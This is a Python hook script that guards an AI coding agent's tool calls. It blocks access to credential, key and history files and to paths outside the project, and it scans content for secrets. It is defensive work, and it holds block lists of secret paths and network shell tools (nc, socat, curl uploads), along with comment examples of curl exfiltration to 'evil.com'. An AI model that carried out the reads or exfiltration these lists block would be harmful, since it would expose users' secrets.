#!/usr/bin/python3
# protect-files.py (hardened)

import fnmatch
import glob
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import unicodedata
from pathlib import Path
from typing import Mapping

script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.append(script_dir)

from utils import get_by_key, get_hooks_logger  # noqa: E402

logger = get_hooks_logger("ProtectFiles")

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────

# CLAUDE_PROJECT_DIR (set by Claude Code) takes precedence when present, since it's
# stable for the whole session; os.getcwd() is the fallback but can drift if cwd
# changes mid-session (cd, subagents), silently widening the boundary check.
PROJECT_ROOT = os.environ.get("CLAUDE_PROJECT_DIR", os.getcwd())

# Get the home directory path object
home_dir = str(Path.home())

ALLOWED_PATTERNS = [
    os.path.join(PROJECT_ROOT, ".claude", "**"),
    os.path.join(PROJECT_ROOT, ".claude-L", "**"),
    "/tmp/**",
    f"{home_dir}/develop/personal/AI-pair-programming/skills/**",
    f"{home_dir}/develop/personal/AI-pair-programming/instructions/**",
    f"{home_dir}/Desktop/*.md",
    f"{home_dir}/Desktop/*.png",
    f"{home_dir}/Desktop/*.jpeg",
    f"{home_dir}/Desktop/*.json",
]

PROTECTED_PATTERNS = [
    ".env",
    ".env.*",
    "**/*.env",
    "**/*.secret",
    "**/*.secrets",
    "**/secrets/**",
    "**/*.pem",
    "**/*.key",
    "**/id_rsa*",
    "**/.ssh/**",
    "**/id_*",
    "**/*.pub",  # opcional (menos crítico, mas útil)
    "**/.gnupg/**",
    "**/*.gpg",
    "**/*.asc",
    "**/.aws/**",
    "**/.azure/**",
    "**/.gcloud/**",
    "**/credentials",
    "**/.git-credentials",
    "**/.gitconfig",
    "**/.netrc",
    "**/.npmrc",
    "**/.yarnrc",
    "**/.pypirc",
    "**/.docker/config.json",
    "**/.kube/config",
    "**/kubeconfig",
    "**/.bash_history",
    "**/.zsh_history",
    "**/.python_history",
    "**/.sqlite_history",
    "**/.psql_history",
    "**/.mysql_history",
    "**/.config/BraveSoftware/**",
    "**/.config/google-chrome/**",
    "**/.config/chromium/**",
    "**/.mozilla/**",
    "**/.cache/mozilla/**",
    "**/*.crt",
    "**/*.csr",
    "**/*.p12",
    "**/*.pfx",
    "**/*.der",
    "**/.git/config",
    "**/.terraform/**",
    "**/*.tfstate",
    "**/*.tfstate.*",
    "**/*.jks",
    "**/*.keystore",
    "**/.dockercfg",
    "**/.config/gh/hosts.yml",
    "/proc/*/environ",
    "/proc/self/environ",
    "**/.pgpass",
    "**/.git/hooks/**",
    "**/.node_repl_history",
    "**/.irb_history",
    "**/fish_history",
    # .claude/hooks, .claude/settings.json etc are symlinks into these real
    # paths — normalize() resolves symlinks, so protect the real targets too,
    # or realpath silently strips the .claude/** prefix before matching.
    os.path.join(PROJECT_ROOT, ".claude", "hooks", "**"),
    os.path.join(PROJECT_ROOT, ".claude", "settings.json"),
    os.path.join(PROJECT_ROOT, ".claude", "settings.local.json"),
]

READ_COMMANDS = {
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "awk",
    "sed",
    "bat",
    "xxd",
    "od",
    "strings",
    "base64",
    "openssl",
}

# commands whose args are ALL file targets (both src/dest for copy-like tools)
COPY_COMMANDS = {"cp", "mv", "rsync", "scp", "install", "dd", "tar", "zip", "cat"}

# destructive/permission commands: delete, wipe, or loosen perms on a target file
DESTRUCTIVE_COMMANDS = {"rm", "unlink", "shred", "truncate"}

# commands whose FIRST non-flag arg is a mode/owner spec, not a file target
PERM_COMMANDS = {"chmod", "chown", "chgrp", "setfacl"}

# getfacl has no mode/owner spec arg — every non-flag arg is a file target
PERM_READONLY_COMMANDS = {"getfacl"}

# commands that can exfiltrate file contents over the network via upload flags
NETWORK_COMMANDS = {"curl", "wget"}

# raw-socket tools: any non-flag arg treated as suspect (can pipe/redirect file contents out)
RAW_SOCKET_COMMANDS = {"nc", "ncat", "socat", "telnet"}

# commands that hide their real target inside a nested string/pipe, so the
# static tokenizer can't see it directly — force a whole-line fallback scan
OPAQUE_COMMANDS = {"eval", "xargs"}

UPLOAD_FLAGS = {"-T", "--upload-file", "-d", "--data", "--data-binary", "--data-raw"}

# substrings that flag a curl/wget arg (URL, query string, data payload) as
# possibly embedding a protected file's name/contents, even without an upload flag
PROTECTED_KEYWORDS = (
    ".env",
    ".secret",
    ".pem",
    ".key",
    "id_rsa",
    ".ssh",
    ".pub",
    ".gnupg",
    ".gpg",
    ".asc",
    ".aws",
    ".azure",
    ".gcloud",
    "credentials",
    ".git-credentials",
    ".gitconfig",
    ".netrc",
    ".npmrc",
    ".yarnrc",
    ".pypirc",
    ".kube",
    "kubeconfig",
    "_history",
    ".p12",
    ".pfx",
)

# interpreters that can read/exfil any file via inline code, bypassing READ_COMMANDS entirely
INTERPRETER_COMMANDS = {
    "python",
    "python3",
    "node",
    "perl",
    "ruby",
    "php",
    "bash",
    "sh",
    "zsh",
}
INLINE_CODE_FLAGS = {"-c", "-e", "--eval"}

# shells whose -c argument is itself a shell command line, not quoted-string
# code — must be re-tokenized as shell, not scanned for nested quote literals
SHELL_INTERPRETER_COMMANDS = {"bash", "sh", "zsh"}

REDIRECT_OPERATORS = {">", ">>"}
INPUT_REDIRECT_OPERATORS = {"<", "<<"}

SHELL_OPERATORS = {"|", ">", ">>", "<", "&&", "||", ";", "\n"}

# bash process substitution: <(cmd) / >(cmd) — smuggles a command whose
# output/input is a target file, bypassing normal tokenization entirely
PROCESS_SUBSTITUTION_RE = re.compile(r"[<>]\(([^()]*)\)")

# find's -exec ... ; terminator uses a bare/escaped semicolon that is NOT a
# shell command separator — split_on_operators() must not cut here, or the
# -exec argument list (and any protected target inside it) gets truncated
# away, silently defeating the whole targets scan.
EXEC_TERMINATOR_RE = re.compile(r"(-exec\b(?:(?!\\;|;).)*?)(\\;|;)", re.DOTALL)

# Shell keywords that are structural, not commands to scan for targets —
# they appear as segments after splitting on ;/newlines inside for/while/if
# blocks (e.g. "do", "done"). Ported from smart_approve.py.
SHELL_KEYWORDS = frozenset(
    {
        "do",
        "done",
        "then",
        "else",
        "elif",
        "fi",
        "esac",
        "{",
        "}",
        "break",
        "continue",
    }
)

# Compound statement headers (for/while/until/if/case/select) — control
# flow, not executable commands with file targets of their own.
_COMPOUND_HEADER_RE = re.compile(r"^(for|while|until|if|case|select)\b")


# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────


def normalize(path: str) -> str:
    """Normalize + resolve symlinks.

    NFKC folds lookalike separator/punctuation codepoints (e.g. U+2044
    FRACTION SLASH, U+FF0E FULLWIDTH FULL STOP) to their ASCII form before
    pattern matching, so a homoglyph can't slip a protected path past
    PROTECTED_PATTERNS. Null bytes are stripped for the same reason — some
    downstream parsers truncate at \\x00, which would let a suffix like
    ".env\\x00.txt" be read as ".env" while the raw string dodges fnmatch.
    """
    path = unicodedata.normalize("NFKC", path).replace("\x00", "")
    try:
        return os.path.realpath(os.path.abspath(path))
    except Exception:
        return path


def is_within_project(path: str) -> bool:
    norm = normalize(path)
    return norm == PROJECT_ROOT or norm.startswith(PROJECT_ROOT.rstrip("/") + os.sep)


def is_allowed(path: str) -> bool:
    """Check if path is in allowed patterns (safe to access)."""
    p = Path(path)
    for pattern in ALLOWED_PATTERNS:
        if fnmatch.fnmatch(path, pattern) or p.match(pattern):
            return True
    return False


def matches_pattern(path: str) -> tuple[bool, str]:
    """Match against protected patterns using pathlib semantics.

    Matching is case-folded so a case-insensitive filesystem (macOS,
    Windows) can't be used to read ".env" via a differently-cased path
    like ".ENV" that would otherwise miss every pattern below.
    """
    path_lower = path.lower()
    p = Path(path_lower)

    for pattern in PROTECTED_PATTERNS:
        pattern_lower = pattern.lower()

        # direct fnmatch (string-based)
        if fnmatch.fnmatch(path_lower, pattern_lower):
            return True, pattern

        # pathlib match (more robust for **)
        if p.match(pattern_lower):
            return True, pattern

    return False, ""


def expand_targets(targets: list[str]) -> list[str]:
    """Expand globs like *.env → actual files."""
    expanded = []
    for t in targets:
        matches = glob.glob(t, recursive=True)
        if matches:
            expanded.extend(matches)
        else:
            expanded.append(t)
    return expanded


ENV_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")


def expand_env_vars(text: str) -> str:
    """Resolve $VAR / ${VAR} against the hook process's own environment.

    A target passed as a bare shell variable (e.g. `cat $SECRET_FILE`) is
    left untouched by shlex — it stays the literal string "$SECRET_FILE",
    which never matches a PROTECTED_PATTERNS glob. The shell resolves it to
    the real path only after this check has already allowed the command.
    Expanding here closes that gap for any variable actually set in this
    process's environment; an unset/foreign variable is left as-is (same
    behavior as before this fix — no new false negative introduced).
    """

    def repl(m: re.Match) -> str:
        name = m.group(1) or m.group(2)
        return os.environ.get(name, m.group(0))

    return ENV_VAR_RE.sub(repl, text)


def strip_heredocs(command: str) -> str:
    """Strip heredoc bodies, leaving just the <<DELIM marker.

    Prevents heredoc content lines (which may legitimately mention protected
    filenames as text, e.g. a doc example) from being treated as
    sub-commands once split_on_operators() cuts on newlines. Ported from
    smart_approve.py.
    """
    lines = command.split("\n")
    result = []
    heredoc_delim = None
    i = 0

    while i < len(lines):
        if heredoc_delim is not None:
            if lines[i].strip() == heredoc_delim:
                heredoc_delim = None
            i += 1
            continue

        m = re.search(r"<<-?\s*['\"]?(\w+)['\"]?", lines[i])
        if m:
            heredoc_delim = m.group(1)

        result.append(lines[i])
        i += 1

    return "\n".join(result)


def split_on_operators(command: str) -> list[str]:
    """Split a shell command string on &&, ||, ;, |, and newlines.

    Quote- and $()-depth-aware (a `;` inside a quoted string or a subshell
    is not a split point), unlike a plain regex split. Ported from
    smart_approve.py, with protect_files' find -exec terminator protection
    layered on top via EXEC_TERMINATOR_RE.
    """
    command = EXEC_TERMINATOR_RE.sub(lambda m: m.group(1) + "\x00", command)
    command = strip_heredocs(command)
    command = command.replace("\\\n", " ")

    segments = []
    current = []
    i = 0
    in_single_quote = False
    in_double_quote = False
    paren_depth = 0

    while i < len(command):
        ch = command[i]

        if ch == "\\" and not in_single_quote and i + 1 < len(command):
            current.append(ch)
            current.append(command[i + 1])
            i += 2
            continue

        if ch == "'" and not in_double_quote and paren_depth == 0:
            in_single_quote = not in_single_quote
            current.append(ch)
            i += 1
            continue
        if ch == '"' and not in_single_quote and paren_depth == 0:
            in_double_quote = not in_double_quote
            current.append(ch)
            i += 1
            continue

        if in_single_quote or in_double_quote:
            current.append(ch)
            i += 1
            continue

        if ch == "$" and i + 1 < len(command) and command[i + 1] == "(":
            paren_depth += 1
            current.append("$")
            current.append("(")
            i += 2
            continue
        if ch == "(" and paren_depth > 0:
            paren_depth += 1
            current.append(ch)
            i += 1
            continue
        if ch == ")" and paren_depth > 0:
            paren_depth -= 1
            current.append(ch)
            i += 1
            continue

        if paren_depth > 0:
            current.append(ch)
            i += 1
            continue

        if ch == "&" and i + 1 < len(command) and command[i + 1] == "&":
            segments.append("".join(current))
            current = []
            i += 2
            continue
        if ch == "|" and i + 1 < len(command) and command[i + 1] == "|":
            segments.append("".join(current))
            current = []
            i += 2
            continue
        if ch in (";", "|", "\n"):
            segments.append("".join(current))
            current = []
            i += 1
            continue

        current.append(ch)
        i += 1

    segments.append("".join(current))
    return [s.replace("\x00", ";").strip() for s in segments if s.strip()]


def extract_subshells(command: str) -> list[str]:
    """Pull inner text out of $(...) / `...`, recursively, so it gets
    scanned too. Depth-tracked (unlike a single regex), and skips $((...))
    arithmetic expansion. Ported from smart_approve.py."""
    subshells = []

    i = 0
    while i < len(command):
        if (
            command[i] == "$"
            and i + 1 < len(command)
            and command[i + 1] == "("
            and not (i + 2 < len(command) and command[i + 2] == "(")
        ):
            depth = 0
            start = i + 2
            j = i + 1
            while j < len(command):
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                    if depth == 0:
                        content = command[start:j]
                        subshells.append(content)
                        subshells.extend(extract_subshells(content))
                        break
                j += 1
            i = j + 1
        else:
            i += 1

    parts = command.split("`")
    for idx in range(1, len(parts), 2):
        content = parts[idx]
        if content.strip():
            subshells.append(content)
            subshells.extend(extract_subshells(content))

    return subshells


def neutralize_subshells(command: str) -> str:
    """Replace each top-level $(...) / `...` span with a placeholder word.

    Their contents are already scanned independently via extract_subshells()
    — this just keeps shlex from mis-tokenizing the raw "$(...)" text when
    splitting the outer command into argv (e.g. `cat $(echo .env)` would
    otherwise shlex-split into the garbage tokens "$(echo" and ".env)").
    """
    result = []
    i = 0
    n = len(command)
    while i < n:
        if command[i] == "$" and i + 1 < n and command[i + 1] == "(":
            depth = 0
            j = i + 1
            while j < n:
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                    if depth == 0:
                        j += 1
                        break
                j += 1
            result.append("__SUBSHELL__")
            i = j
            continue
        if command[i] == "`":
            end = command.find("`", i + 1)
            if end == -1:
                result.append(command[i:])
                break
            result.append("__SUBSHELL__")
            i = end + 1
            continue
        result.append(command[i])
        i += 1
    return "".join(result)


def is_shell_structural(cmd: str) -> bool:
    """True if cmd is a shell keyword or compound-statement header, not an
    actual command with file targets. Ported from smart_approve.py."""
    if cmd in SHELL_KEYWORDS:
        return True
    if _COMPOUND_HEADER_RE.match(cmd):
        return True
    return False


def is_standalone_assignment(cmd: str) -> bool:
    """True if cmd is purely a variable assignment (no command follows),
    e.g. "FOO=bar" — its value is picked up via expand_env_vars/subshell
    extraction elsewhere, so scanning the bare assignment is noise. Ported
    from smart_approve.py."""
    m = re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", cmd)
    if not m:
        return False
    return _assignment_fully_consumed(cmd, m.end())


def _assignment_fully_consumed(cmd: str, value_start: int) -> bool:
    """Return True if the assignment value runs to end-of-string (no
    trailing command)."""
    i = value_start
    n = len(cmd)

    if i < n and cmd[i] == '"':
        i += 1
        while i < n and cmd[i] != '"':
            if cmd[i] == "\\" and i + 1 < n:
                i += 2
            else:
                i += 1
        if i < n:
            i += 1
    elif i < n and cmd[i] == "'":
        i += 1
        while i < n and cmd[i] != "'":
            i += 1
        if i < n:
            i += 1
    else:
        paren_depth = 0
        while i < n:
            ch = cmd[i]
            if ch == "$" and i + 1 < n and cmd[i + 1] == "(":
                paren_depth += 1
                i += 2
                continue
            if ch == "(" and paren_depth > 0:
                paren_depth += 1
                i += 1
                continue
            if ch == ")" and paren_depth > 0:
                paren_depth -= 1
                i += 1
                continue
            if paren_depth > 0:
                i += 1
                continue
            if ch in (" ", "\t"):
                break
            i += 1

    return cmd[i:].strip() == ""


def extract_upload_ref(arg: str) -> str | None:
    """Pull a file path out of an @file / field=@file style value."""
    at = arg.find("@")
    if at == -1:
        return None
    ref = arg[at + 1 :]
    return ref if ref and ref not in ("-", "") else None


def extract_inline_code_refs(code: str) -> list[str]:
    """Pull quoted string literals out of inline interpreter code (-c/-e), since
    those are the most common way scripts embed a target file path."""
    return re.findall(r"""['"]([^'"]{2,})['"]""", code)


def extract_targets_from_tokens(tokens: list[str]) -> list[str]:
    """Extract file arguments from a single tokenized command."""
    targets = []
    it = iter(tokens)

    # redirection targets (`>`, `>>` write; `<`, `<<` read) regardless of command
    for i, tok in enumerate(tokens):
        if tok in REDIRECT_OPERATORS or tok in INPUT_REDIRECT_OPERATORS:
            if i + 1 < len(tokens):
                nxt = tokens[i + 1]
                if nxt not in SHELL_OPERATORS:
                    targets.append(nxt)

    for token in it:
        cmd = os.path.basename(token)

        if cmd == "find":
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg in ("-exec", "-execdir"):
                    for sub in it:
                        if sub in ("\\;", ";", "+"):
                            break
                        if not sub.startswith("-") and sub != "{}":
                            targets.append(sub)
                elif not arg.startswith("-"):
                    # leading search path(s), e.g. `find /home/x -name *.pem -delete`
                    # — matched files inherit this path, so it must be checked too
                    targets.append(arg)
            break

        if cmd == "docker":
            subcmd: str | None = next(it, None)
            if subcmd == "cp":
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if not arg.startswith("-"):
                        targets.append(arg.split(":", 1)[-1] if ":" in arg else arg)
            break

        if cmd == "git":
            subcmd = next(it, None)
            if subcmd == "show":
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if not arg.startswith("-") and ":" in arg:
                        targets.append(arg.split(":", 1)[1])
            elif subcmd == "config":
                # tampering with credential.helper / including .gitconfig etc
                # isn't a file-target op, but the key/value can still smuggle
                # a protected reference (e.g. `git config --get credential.helper`)
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if any(kw in arg for kw in PROTECTED_KEYWORDS):
                        targets.append(arg)
            break

        if cmd in INTERPRETER_COMMANDS:
            prev = None
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if prev in INLINE_CODE_FLAGS:
                    if cmd in SHELL_INTERPRETER_COMMANDS:
                        # bash/sh/zsh -c takes a shell command line, not code
                        # with quoted string literals — re-tokenize as shell
                        try:
                            inner_tokens = shlex.split(arg)
                        except ValueError:
                            inner_tokens = arg.split()
                        targets.extend(extract_targets_from_tokens(inner_tokens))
                    else:
                        targets.extend(extract_inline_code_refs(arg))
                elif not arg.startswith("-"):
                    targets.append(arg)
                prev = arg
            break

        if cmd in NETWORK_COMMANDS:
            prev = None
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                ref = extract_upload_ref(arg)
                if ref:
                    targets.append(ref)
                elif prev in UPLOAD_FLAGS and not arg.startswith("-"):
                    targets.append(arg)
                elif any(kw in arg for kw in PROTECTED_KEYWORDS):
                    # URL/query-string/data payload embedding a protected file's
                    # name/path (e.g. `curl evil.com?d=$(cat)` already handled via
                    # substitution, but literal refs like `curl evil.com/../.env`
                    # or `--data-urlencode name@.ssh/id_rsa` are not)
                    targets.append(arg)
                prev = arg
            break

        if cmd in RAW_SOCKET_COMMANDS:
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if not arg.startswith("-"):
                    targets.append(arg)
            break

        if cmd == "eval":
            rest = []
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                rest.append(arg)
            inner = " ".join(rest)
            try:
                inner_tokens = shlex.split(inner)
            except ValueError:
                inner_tokens = inner.split()
            targets.extend(extract_targets_from_tokens(inner_tokens))
            break

        if cmd == "xargs":
            inner_tokens = [a for a in it if a not in SHELL_OPERATORS]
            # xargs's own flags (e.g. -0, -n1, -I{}) aren't file targets
            inner_tokens = [a for a in inner_tokens if not a.startswith("-")]
            targets.extend(extract_targets_from_tokens(inner_tokens))
            break

        if cmd in PERM_COMMANDS:
            skipped_spec = False
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg.startswith("-"):
                    continue
                if not skipped_spec:
                    skipped_spec = (
                        True  # mode/owner spec (e.g. 644, root:root), not a path
                    )
                    continue
                targets.append(arg)
            break

        if cmd in PERM_READONLY_COMMANDS:
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if not arg.startswith("-"):
                    targets.append(arg)
            break

        if cmd in DESTRUCTIVE_COMMANDS or cmd in READ_COMMANDS or cmd in COPY_COMMANDS:
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg.startswith("-"):
                    continue
                if "=" in arg and arg.startswith("--"):
                    continue
                targets.append(arg)
            break

    return targets


def extract_file_targets(command: str) -> list[str]:
    """Extract file arguments from common read/copy commands, across chained
    subcommands and command substitutions ($(...) / `...`)."""
    targets = []

    raw_commands = split_on_operators(command)
    for sub in extract_subshells(command):
        raw_commands.extend(split_on_operators(sub))
    for m in PROCESS_SUBSTITUTION_RE.finditer(command):
        raw_commands.extend(split_on_operators(m.group(1)))

    raw_commands = [
        c
        for c in raw_commands
        if not is_shell_structural(c) and not is_standalone_assignment(c)
    ]

    for sub in raw_commands:
        # nested $(...) / `...` inside this segment are scanned separately
        # via extract_subshells() above — neutralize them here so shlex
        # doesn't choke tokenizing them as literal argument text (e.g.
        # `cat $(echo .env)` shlex-splits into garbage tokens otherwise).
        neutralized = neutralize_subshells(sub)
        try:
            tokens = shlex.split(neutralized)
        except ValueError:
            tokens = neutralized.split()
        targets.extend(extract_targets_from_tokens(tokens))

    # eval/xargs can smuggle a target through stdin or a nested string that the
    # per-subcommand tokenizer can't resolve (e.g. `echo .env | xargs cat`) —
    # fall back to a whole-line keyword scan whenever either appears. Tokenize
    # with shlex first so quoted words (e.g. `echo '.env'`) get their quotes
    # stripped before the keyword match — a raw \S+ split leaves the quotes
    # attached, which then survives into normalize() as part of the filename
    # and silently dodges every PROTECTED_PATTERNS glob.
    if re.search(r"\b(eval|xargs)\b", command):
        try:
            words = shlex.split(command)
        except ValueError:
            words = command.split()
        for word in words:
            if any(kw in word for kw in PROTECTED_KEYWORDS):
                targets.append(word)

    return [expand_env_vars(t) for t in targets]


def deny(file_path: str, pattern: str, source: str) -> None:
    print(
        json.dumps(
            {
                "decision": "deny",
                "file": file_path,
                "source": source,
                "reason": f"matches protected pattern '{pattern}'",
            }
        ),
        file=sys.stderr,
    )
    logger.debug(f"Denied '{file_path}' ({source}) due to pattern '{pattern}'")
    sys.exit(2)


# ─────────────────────────────────────────────────────────────
# CONTENT-BASED SECRET SCAN (complements the path-based checks above:
# a secret can sit in a file whose path doesn't match PROTECTED_PATTERNS)
# ─────────────────────────────────────────────────────────────

DETECT_SECRETS_BIN = shutil.which("detect-secrets")

# Regex fallback used only when detect-secrets isn't installed, so content
# scanning doesn't silently no-op on a machine without the binary. Ported
# from the project's JS secret-scan hook.
FALLBACK_SECRET_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    (
        "AWS Secret Key",
        re.compile(
            r"aws_secret_access_key\s*=\s*[\"']?[A-Za-z0-9/+=]{40}", re.IGNORECASE
        ),
    ),
    ("GitHub Token", re.compile(r"(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}")),
    (
        "Private Key",
        re.compile(r"-----BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY-----"),
    ),
    (
        "Generic API Key",
        re.compile(r"api[_-]?key\s*[:=]\s*[\"'][a-zA-Z0-9]{20,}[\"']", re.IGNORECASE),
    ),
    ("Slack Token", re.compile(r"xox[bpors]-[0-9a-zA-Z-]{10,}")),
    (
        "Database URL",
        re.compile(r"(postgres|mysql|mongodb|redis)://[^:]+:[^@\s]+@"),
    ),
    (
        "JWT Token",
        re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
    ),
]


def scan_content_fallback(content: str) -> list[dict]:
    """Regex-based secret scan used when detect-secrets isn't installed."""
    findings = []
    lines = content.split("\n")
    for name, regex in FALLBACK_SECRET_PATTERNS:
        for i, line in enumerate(lines):
            if regex.search(line):
                findings.append({"type": name, "line": i + 1})
    return findings


def deny_secret(file_path: str, findings: list[dict]) -> None:
    types = ", ".join(sorted({f["type"] for f in findings}))
    print(
        json.dumps(
            {
                "decision": "deny",
                "file": file_path,
                "source": "secret_scan",
                "reason": f"potential secret detected ({types})",
            }
        ),
        file=sys.stderr,
    )
    logger.debug(f"Denied '{file_path}' — secrets found: {findings}")
    sys.exit(2)


def scan_content_for_secrets(content: str, file_path: str) -> list[dict]:
    """Run detect-secrets against `content` as if it were `file_path`. Scans
    by writing to a tempdir under the target's basename and cwd'ing into it —
    scanning by absolute path silently yields empty results, since
    detect-secrets' filters key off a repo-relative path."""
    if not DETECT_SECRETS_BIN:
        return scan_content_fallback(content)

    suffix = Path(file_path).name or "scanned_file"

    with tempfile.TemporaryDirectory() as tmpdir:
        target = Path(tmpdir) / suffix
        target.write_text(content, encoding="utf-8")

        try:
            result = subprocess.run(
                [DETECT_SECRETS_BIN, "scan", suffix],
                cwd=tmpdir,
                capture_output=True,
                text=True,
                timeout=15,
            )
        except (subprocess.TimeoutExpired, OSError) as exc:
            logger.debug(f"detect-secrets invocation failed: {exc}")
            return []

        try:
            report = json.loads(result.stdout)
        except json.JSONDecodeError:
            logger.debug(f"detect-secrets non-JSON output: {result.stdout[:500]}")
            return []

        return report.get("results", {}).get(suffix, [])


def get_write_content(
    tool_input: Mapping, tool_name: str, file_path: str
) -> str | None:
    """Content about to enter the file, or the file's current content on
    disk when the tool is only reading it (Read, or a Bash command target)."""
    if tool_name == "Write":
        return get_by_key(tool_input, "content")
    if tool_name == "Edit":
        return get_by_key(tool_input, "new_string")
    try:
        return Path(file_path).read_text(encoding="utf-8")
    except UnicodeDecodeError:
        # Non-UTF-8 content (UTF-16, latin-1, or a few stray bad bytes) must
        # still reach the secret scanner — silently returning None here let
        # any secret stored in a differently-encoded file skip detect-secrets
        # entirely. errors="replace" degrades gracefully instead of losing
        # the scan outright.
        try:
            return Path(file_path).read_text(encoding="utf-8", errors="replace")
        except OSError:
            return None
    except OSError:
        return None


# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────


def main():
    try:
        payload = json.load(sys.stdin)
    except json.JSONDecodeError as e:
        logger.debug(f"Invalid JSON: {e}")
        sys.exit(1)

    tool_name = get_by_key(payload, "tool_name")
    tool_input = get_by_key(payload, "tool_input")

    # ── 1. Direct file access (Read/Write/Edit/NotebookEdit tools)
    # Grep/Glob use "path" instead of "file_path" — without this, a search
    # scoped to a protected file/dir (e.g. Grep pattern=".*" path=".env")
    # never hits any check below and its contents leak straight through.
    file_path = (
        get_by_key(tool_input, "file_path")
        or get_by_key(tool_input, "notebook_path")
        or get_by_key(tool_input, "path")
    )

    if file_path:
        norm = normalize(file_path)
        allowed = is_allowed(norm)

        # allowlist only waives the project-boundary check (e.g. /tmp/**),
        # never the protected-pattern check — a secret is a secret anywhere
        if not allowed and not is_within_project(norm):
            deny(file_path, "outside_project", "path_escape")

        blocked, pattern = matches_pattern(norm)
        if blocked:
            deny(file_path, pattern, "file_path")

        content = get_write_content(tool_input, tool_name, file_path)
        if content:
            findings = scan_content_for_secrets(content, file_path)
            if findings:
                deny_secret(file_path, findings)

        logger.debug(f"Allowed file access: {file_path}")

    # ── 2. Shell command inspection
    command = get_by_key(tool_input, "command")

    if command:
        targets = extract_file_targets(command)
        targets = expand_targets(targets)

        for target in targets:
            norm = normalize(target)
            allowed = is_allowed(norm)

            # allowlist only waives the project-boundary check (e.g. /tmp/**),
            # never the protected-pattern check — a secret is a secret anywhere
            if not allowed and not is_within_project(norm):
                deny(target, "outside_project", "command_path_escape")

            blocked, pattern = matches_pattern(norm)
            if blocked:
                deny(target, pattern, "command_read")

            if os.path.isfile(target):
                content = get_write_content(tool_input, "Bash", target)
                if content:
                    findings = scan_content_for_secrets(content, target)
                    if findings:
                        deny_secret(target, findings)

            logger.debug(f"Allowed command: {command} access: {target}")

    sys.exit(0)


if __name__ == "__main__":
    main()
